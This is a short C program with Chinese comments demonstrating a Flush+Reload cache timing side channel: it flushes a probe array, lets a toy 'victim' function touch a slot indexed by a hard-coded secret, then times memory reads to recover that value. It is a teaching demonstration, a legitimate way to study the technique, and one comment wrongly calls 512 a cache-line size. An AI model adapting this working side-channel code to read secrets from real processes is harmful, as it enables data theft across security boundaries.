#include"stdio.h"
#include "stdlib.h"
#include "stdint.h"
#include "x86intrin.h"
#define CACHE_HIT_THRESHOLD (90)
/**
 * 数据定义
 * buffer:探测数组
 * secret：想要窃取的数据
*/
unsigned char buffer[256*4096];//512恰好为一个cache line大小，作为探测数组
/**
 * 受害者函数   
 */


/**
 * 将前面定义的
*/
void flush(){
    for (size_t i = 0; i < 256; i++)
    {
        buffer[i*4096]=66;
    }
    
   for (uint32_t i = 0; i < 256; ++i)
   {
        _mm_clflush(&buffer[i*4096]);//将探测数组从缓存中驱逐
   }
}

void victim(){
    int32_t secret = 202;
    //char* secret = "0x4F1D4F9A8B753"; //我们想要窃取的密钥值
    uint8_t temp = buffer[secret*4096];
}

void reload(){
    uint32_t junk = 0;//用于读取数据
    register uint64_t timeBegin,timeEnd;//表示时间戳
    volatile uint64_t *addr;//表示读取数据的地址
    size_t mix_i=0;
    for (size_t i = 0; i < 256; i++)
    {
        mix_i = ((i * 167) + 13) & 255;
        addr = &buffer[mix_i*4096];
        timeBegin = __rdtscp(&junk);
        junk = *addr;//访问特定的cache line
        timeEnd = __rdtscp(&junk) - timeBegin;
        if(timeEnd< CACHE_HIT_THRESHOLD){
            printf("the hit time is %lu ",timeEnd);
            printf("array[%lu*4096] is in the cache  ",mix_i);
            printf("the secret is %lu\n",mix_i);
        }
    }    
}

/**
 * 主函数
*/
int main(){
    flush();
    victim();
    reload();
    return 0;
}